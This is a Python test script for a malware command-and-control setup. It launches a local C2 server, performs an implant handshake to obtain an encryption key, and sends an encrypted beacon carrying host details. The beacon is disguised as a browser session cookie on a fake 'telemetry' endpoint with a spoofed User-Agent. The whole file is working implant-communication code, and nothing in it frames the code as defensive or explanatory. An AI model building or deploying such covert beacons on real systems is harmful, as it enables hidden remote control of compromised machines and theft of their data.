#!/usr/bin/env python3
import requests
import json
import hashlib
import base64
from cryptography.fernet import Fernet
import time
import subprocess

print("=== FINAL BEACON TEST (Matching implant behavior) ===")

# Start C2
c2 = subprocess.Popen(['python3', 'c2.py'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
time.sleep(3)

try:
    # 1. Handshake
    fingerprint = "527c0c57d2fc4447bd0135ee7bcf6a096841ec650c70a8cebb72c4b392aa1d73"
    implant_id_hash = hashlib.md5(fingerprint.encode()).hexdigest()[:8]
    
    handshake_data = {
        "fingerprint": fingerprint,
        "machine_id": fingerprint,
        "implant_id_hash": implant_id_hash,
        "platform": "linux",
        "arch": "x64"
    }
    
    print(f"[1] Handshake...")
    response = requests.post('http://localhost:4444/handshake', json=handshake_data, timeout=5)
    print(f"   Status: {response.status_code}")
    
    if response.status_code != 200:
        print(f"❌ Handshake failed: {response.text}")
        exit(1)
    
    result = response.json()
    session_key_b64 = result.get('key')
    print(f"✅ Got session key")
    
    # 2. Prepare beacon data (EXACTLY like implant does)
    beacon_data = {
        'id': implant_id_hash,
        'ts': int(time.time()),
        'sys': {
            'hostname': 'test-host',
            'platform': 'linux',
            'arch': 'x64',
            'user': 'testuser'
        },
        'target': 'python3'
    }
    
    print(f"[2] Beacon data prepared")
    
    # 3. Encrypt with Fernet
    f = Fernet(session_key_b64.encode())
    encrypted = f.encrypt(json.dumps(beacon_data).encode())
    
    # 4. Base64 encode
    encoded_data = base64.b64encode(encrypted).decode()
    
    print(f"[3] Encrypted and base64 encoded")
    
    # 5. Send with cookie and headers
    cookies = {'session': encoded_data}
    headers = {
        'Authorization': f'Bearer {implant_id_hash}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }
    
    print(f"[4] Sending beacon...")
    
    response = requests.post(
        'http://localhost:4444/api/v1/telemetry',
        cookies=cookies,
        headers=headers,
        timeout=5
    )
    
    print(f"\n[5] Beacon response:")
    print(f"   Status: {response.status_code}")
    print(f"   Response: {response.text}")
    
    if response.status_code == 200:
        print("🎉 ✅ BEACON SUCCESS!")
    else:
        print("❌ Beacon failed")
    
finally:
    print("\n[6] Cleaning up...")
    c2.terminate()
    c2.wait()

print("\n=== TEST COMPLETE ===")
